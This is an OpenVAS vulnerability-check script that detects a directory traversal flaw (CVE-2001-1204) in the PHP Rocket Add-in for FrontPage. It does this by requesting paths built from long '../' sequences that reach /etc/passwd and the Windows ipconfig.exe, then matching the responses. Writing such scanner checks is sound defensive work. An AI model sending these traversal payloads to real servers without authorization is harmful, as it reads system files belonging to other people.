# OpenVAS Vulnerability Test
# $Id: phprocketaddin_traversal.nasl 17 2013-10-27 14:01:43Z jan $
# Description: PHP Rocket Add-in File Traversal
#
# Authors:
# Drew Hintz ( http://guh.nu ) and Valeska Pederson
# Based on scripts written by Renaud Deraison and  HD Moore
#
# Copyright:
# Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "There is a vulnerability in the PHP Rocket Add-in for FrontPage 
that allows a remote attacker to view the contents of any arbitrary 
file to which the web user has access.  This vulnerability exists 
because the PHP Rocket Add-in does not filter out ../ and is therefore 
susceptible to this directory traversal attack.

More Information: http://www.securityfocus.com/bid/3751";

if(description)
{
 script_id(10831); 
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3751);
 script_cve_id("CVE-2001-1204");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 name = "PHP Rocket Add-in File Traversal";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary;

 script_description(desc);
 
 summary = "Looks for a directory traversal vulnerability in the PHP Rocket Add-in for FrontPage.";
 
 script_summary(summary);
 script_category(ACT_GATHER_INFO);
 script_copyright("This script is Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}


include("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


#check for vulnerable version running on *nix

function check(req)
{
 soc = http_open_socket(port);
 if(soc)
 {
 req = http_get(item:req, port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);

 http_close_socket(soc);
 pat = "root:"; #string returned by webserver if it's vulnerable
 if(pat >< r) {
   if(egrep(pattern:".*root:.*:0:[01]:.*", string:r)) {
	   	security_warning(port:port);
		exit(0);
   } #end final if pattern match
  } #ends outer if pattern match
 } #ends outer if(soc)
 return(0);
} #ends function

url = string("/phprocketaddin/?page=../../../../../../../../../../../../../../../etc/passwd");
if(check(req:url))exit(0);

url = string("/index.php?page=../../../../../../../../../../../../../../../etc/passwd");
if(check(req:url))exit(0);


#check for vulnerable version running on Windows


function checkwin(req)
{
 soc = http_open_socket(port);
 if(soc)
 {
 req = http_get(item:req, port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);

 http_close_socket(soc);
 pat = "IP Configuration"; #string returned by webserver if it's vulnerable

 if(pat >< r) {
   	security_warning(port:port);
	return(1);
 	}
 }
 return(0);
}

url = string("/phprocketaddin/?page=../../../../../../../../../../../../../../../WINNT/system32/ipconfig.exe");
if(checkwin(req:url))exit(0);

url = string("/index.php?page=../../../../../../../../../../../../../../../../../WINNT/system32/ipconfig.exe");
if(checkwin(req:url))exit(0);





